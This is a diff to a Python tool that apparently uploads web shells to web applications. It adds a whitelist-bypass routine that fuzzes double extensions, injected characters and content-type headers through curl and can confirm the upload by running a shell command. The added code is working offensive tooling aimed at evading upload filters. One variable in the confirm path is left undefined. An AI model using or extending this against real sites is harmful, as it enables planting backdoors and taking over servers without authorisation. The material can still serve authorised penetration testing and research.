@@ -3,10 +3,12 @@ import subprocess
 import json
 import argparse
 
+
 def import_config_variables():
 	with open("config.json","r") as file:
 		data = json.load(file)
 	return data
+
 
 def get_curl_subprocess(curl_filename):
 	curl_post = []
@@ -25,6 +27,8 @@ def get_curl_subprocess(curl_filename):
 	curl_post.append("@-")
 	return curl_post,binary_payload
 
+
+# function to replace placeholders in text with provided arguments
 def process_text(payload_text_template, json_data, header=None, extension=None, mime_header=None):
 	# use regex to replace placeholders in the cURL with configured variables
 	for key, value in json_data.items():
@@ -37,7 +41,8 @@ def process_text(payload_text_template, json_data, header=None, extension=None, 
 	else: 
 		payload_text_template = re.sub(r'HEADER','',payload_text_template)
 	if extension != None:
-		payload_text_template = re.sub(r'EXTENSION',extension,payload_text_template)
+		# passing this string as a function is the only workaround to force regex to process said string literally
+		payload_text_template = re.sub(r'EXTENSION', lambda m: extension, payload_text_template)
 	else: 
 		payload_text_template = re.sub(r'EXTENSION','',payload_text_template)
 	if mime_header != None:
@@ -45,12 +50,14 @@ def process_text(payload_text_template, json_data, header=None, extension=None, 
 	else: 
 		payload_text_template = re.sub(r'MIME','',payload_text_template)
 	return payload_text_template
+
 			
 def process_curl(curl_subprocess_input_list, json_data, header=None, extension=None, mime_header=None):
 	curl_subprocess_output_list = []
 	for item in curl_subprocess_input_list:
 		curl_subprocess_output_list.append(process_text(item,json_data, header, extension, mime_header))
 	return curl_subprocess_output_list
+
 
 def print_attack_summary(json_data, script_args, bypass_type):
 	print(F"Shell: {script_args.shell_type}")
@@ -61,14 +68,17 @@ def print_attack_summary(json_data, script_args, bypass_type):
 	if script_args.confirm:
 		print(F"Confirm with command: {json_data["WEBSHELL_COMMAND"]}")
 
+
 def print_attack_verbose_summary(json_data, script_args, bypass_type):
 	print_attack_summary(json_data, script_args, bypass_type)
+
 
 def confirm_file_upload(curl_subprocess, json_data, header=None, extension=None, mime_header=None):
 	processed_get_curl = process_curl(curl_subprocess,json_data,header,extension,mime_header)
 	#print(processed_get_curl)
 	verification_response = subprocess.run(processed_get_curl, capture_output=True,text=True)
 	return verification_response.stdout
+
 
 def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload, arg_confirm):
 	for key, value in json_data.items():
@@ -95,7 +105,53 @@ def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload, arg_conf
 					if arg_confirm:
 						confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'],json_data,header,extension)
 						print(confirmed_output)
+
 						
+def run_whitelist_bypass(json_data, curl_subprocess_list, binary_payload, arg_confirm):
+	for key, value in json_data.items():
+		print(key + " : " + str(value))
+	print("\n subprocess\n")
+	processed_curl = process_curl(curl_subprocess_list,json_data)
+	for curl_process in processed_curl:
+		print(curl_process)
+	print("\n binary piece \n")
+	print(binary_payload)
+	print("\n Fuzzing all combinations of  double extenstions, character injectinos, and content type headers:\n")
+	for curl_process in processed_curl:
+		print(curl_process)
+	for script_filetype in json_data["FILETYPES"]:
+		# cfind the script file extension
+		if script_filetype["TYPE_NAME"] == json_data["SCRIPT_FILE_TYPE_NAME"]:
+			for script_file_extension in script_filetype["TYPE_EXTENSIONS"]:
+				# loop through other file types
+				for other_filetype in json_data["FILETYPES"]:
+					if other_filetype["TYPE_NAME"] != json_data["SCRIPT_FILE_TYPE_NAME"]:
+						# get all possible extension injections to fuzz
+						extension_injection_list = []
+						for other_filetype_extension in other_filetype["TYPE_EXTENSIONS"]:
+							# cycle through every character for character injection attack
+							for injection_character in json_data["CHARACTER_INJECTION_CHARACTERS"]:
+								extension_injection_list.append(fr"{injection_character}{other_filetype_extension}{script_file_extension}")
+								extension_injection_list.append(fr"{other_filetype_extension}{injection_character}{script_file_extension}")
+								extension_injection_list.append(fr"{script_file_extension}{injection_character}{other_filetype_extension}")
+								extension_injection_list.append(fr"{script_file_extension}{other_filetype_extension}{injection_character}")
+						# fuzz for each extension while iterating though each header type
+						for content_type in other_filetype["TYPE_CONTENT_HEADERS"]:
+							for extension in extension_injection_list:
+								print(F"Extension: {extension}, Header: {content_type}")
+								binary_file_output = process_text(binary_payload, json_data, content_type, extension)
+								binary_file_output = binary_file_output.encode('utf-8')
+								# print(binary_file_output)
+								# send web request
+								curl_response = subprocess.run(processed_curl, input=binary_file_output, capture_output=True, text=False)
+								print(curl_response.stdout)
+								# # process confirm cURL to confirm file upload and print output:
+								if arg_confirm:
+									confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'], json_data, header, extension)
+									print(confirmed_output)
+						
+		
+
 def main():
 	try:
 		
@@ -135,7 +191,7 @@ def main():
 			case "Blacklist Bypass":
 				run_blacklist_bypass(config_variables, curl_subprocess, binary_payload, args.confirm)
 			case "Whitelist Bypass":
-				print("whitelist bypass not existent yet")
+				run_whitelist_bypass(config_variables, curl_subprocess, binary_payload, args.confirm)
 			case _:
 				print("no bypass argument selected")
 		
